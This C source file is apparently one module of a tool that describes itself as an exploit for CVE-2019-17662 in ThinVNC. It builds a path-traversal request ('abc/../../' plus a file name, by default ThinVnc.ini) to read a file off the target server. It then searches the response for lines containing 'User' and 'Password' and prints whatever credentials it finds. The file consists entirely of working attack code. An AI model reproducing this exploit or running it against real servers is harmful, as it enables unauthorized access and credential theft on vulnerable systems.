#include "modules.h"

void help(char *name)
{
  
  fprintf(stderr,"[" MAGENTA("~")"] Usage: ");
  fprintf(stderr, GREEN("%s") " -u URL [-f File]" "\n\n",name);
  fprintf(stderr,"[" CYAN(">") "] Options:\n");
  fprintf(stderr,YELLOW("OPTIONS")" \t " MAGENTA("Desciption")"\n");
  fprintf(stderr,"-u URL \t\t Base URL\n");    
  fprintf(stderr,"-f File \t [Optional] File Name To Query \(Default: ThinVnc.ini)\n");   
  exit(-1); 
}

void showvalues(char *url, char *file)
{
  fprintf(stdout,"["GREEN("+")"] CVE-2019-17662 exploit by " CYAN("@whokilleddb") "\n" );
  fprintf(stdout,"["RED("o")"] Target : " RED("%s") "\n", url );
  fprintf(stdout,"["MAGENTA("x")"] File To Read: " BLUE("%s") "\n", file );    
}

void GET_URL(char *url, char *file)
{
  if (url[strlen(url)-1]=='/')
  {
    asprintf(&URL,"%sabc/../../%s",url,file);
  }
  else
  {
    asprintf(&URL,"%s/abc/../../%s",url,file);
  }    
  fprintf(stdout,"["CYAN("~")"] Trying to Read: " GREEN("%s") "\n",URL);   
}

void INIT_CHUNCK(struct chunck *s) 
{
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) 
  {
    fprintf(stderr, "[-] "RED("malloc() Failed!" "\n"));
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t GET_RESP(void *ptr, size_t size, size_t nmemb, struct chunck *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) 
  {
  fprintf(stderr, "[-] "RED("realloc() Failed!" "\n"));
  exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

void CHECK_CREDS(char *resp)
{
  int u=0,p=0;
  char* pch = NULL;

  fprintf(stdout,"[" YELLOW(":")"] Trying To Fetch Credentials\n");

  pch = strtok(resp, "\n");
  while (pch != NULL)
  {
    if((strstr(pch,"User") != NULL))
    {
      u=1;
      fprintf(stdout,"["GREEN("-")"] %s\n",pch);
    }
    if((strstr(pch,"Password") != NULL))
    {
      p=1;
      fprintf(stdout,"["BLUE("-")"] %s\n",pch);
    }
    pch = strtok(NULL, "\n");
  }

  if (u==0 && p==0)
  {
    fprintf(stderr,"["RED("-")"] Could Not Find Any Credentials");
  }
}